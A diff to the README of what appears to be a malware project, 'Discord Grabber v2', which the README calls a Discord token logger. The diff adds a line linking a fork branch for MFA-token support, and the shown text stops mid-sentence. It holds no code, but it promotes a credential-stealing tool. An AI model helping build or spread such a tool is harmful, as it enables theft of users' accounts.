@@ -1,3 +1,5 @@
+fork for pull request https://github.com/pp0236/DiscordGrabber/tree/mfa-token-support-and-ignored-LOCK-file
+
 # Discord Grabber v2
 
 Discord Grabber v2 is the second version of a discord token logger, improvements from the previous version are:
